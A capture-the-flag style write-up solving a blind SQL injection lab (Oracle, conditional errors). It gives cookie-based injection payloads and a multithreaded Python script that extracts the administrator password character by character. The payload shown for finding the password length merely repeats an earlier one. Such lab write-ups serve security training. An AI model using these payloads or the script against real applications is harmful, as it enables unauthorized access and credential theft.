# Lab: Blind SQL injection with conditional errors
## Task
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

## Solution
With a little bit testing, we know that the database is Oracle.
```
TrackingId=rNDIHSBcCc2g31gX'+AND+(SELECT+1+FROM+dual)=1--
```  

When testing the payload, I found this one worked:  
```
'+AND+(SELECT+CASE+WHEN+(1=2)+THEN+1/0+ELSE+2+END+FROM+dual)=2--
```  

Now, let's use this to figure out the `administrator`'s password:  
```
'+AND+(SELECT+CASE+WHEN+(1=2)+THEN+1/0+ELSE+2+END+FROM+dual)=2--
```  

Firstly, find the password's length:  

![image](https://user-images.githubusercontent.com/44528004/130166734-9a456be5-66d2-4048-b97e-b45da09ce5b8.png)  
> As an error occured, the length is 20.  

Next, find each letter of the password with the following payload template:  
```
'+AND+(SELECT+CASE+WHEN+(SUBSTR((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='a')+THEN+1/0+ELSE+2+END+FROM+dual)=2--
'+AND+(SELECT+CASE+WHEN+(SUBSTR((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='b')+THEN+1/0+ELSE+2+END+FROM+dual)=2--
...
'+AND+(SELECT+CASE+WHEN+(SUBSTR((SELECT+password+FROM+users+WHERE+username='administrator'),2,1)='a')+THEN+1/0+ELSE+2+END+FROM+dual)=2--
'+AND+(SELECT+CASE+WHEN+(SUBSTR((SELECT+password+FROM+users+WHERE+username='administrator'),2,1)='b')+THEN+1/0+ELSE+2+END+FROM+dual)=2--
...
```

Script:  
```python
import requests
import string
from concurrent import futures
from concurrent.futures import ThreadPoolExecutor

URL = 'https://acf91f801fe3b0a7802cff6400700018.web-security-academy.net/filter?category=Gifts'
alphas = list(string.ascii_lowercase)
alphas.extend(list(string.ascii_uppercase))
alphas.extend(list(string.digits))

def brute(i):
    for j in alphas:
        COOKIES =  {'TrackingId':f"rNDIHSBcCc2g31gX'+AND+(SELECT+CASE+WHEN+(SUBSTR((SELECT+password+FROM+users+WHERE+username='administrator'),{i},1)='{j}')+THEN+1/0+ELSE+2+END+FROM+dual)=2--",
        'session':'zborbpfMUYHP1DUkgOtF1WID4ymPSr9G'}
        resp = requests.get(URL, cookies=COOKIES)
        if resp.status_code == 500:
            return (i, j)

res = []
with ThreadPoolExecutor(max_workers=10) as executor:
    tasks = []
    for i in range(1, 21):
        tasks.append(executor.submit(brute, i))
    for f in futures.as_completed(tasks):
        res.append(f.result())

res = sorted(res, key=lambda x: x[0])
print(len(res))
print(''.join([x[1] for x in res]))
```

Run script:
```
(env) PS E:\CTF> py .\intruder.py
20
8clzfepzojeclf6dg4jr
```

Login:  

![image](https://user-images.githubusercontent.com/44528004/130168000-48f4fc3b-0c81-4e93-b09a-662d0b06100b.png)


![image](https://user-images.githubusercontent.com/44528004/130168008-5041934d-df63-4bcd-a092-c09d464da290.png)
> Solved!
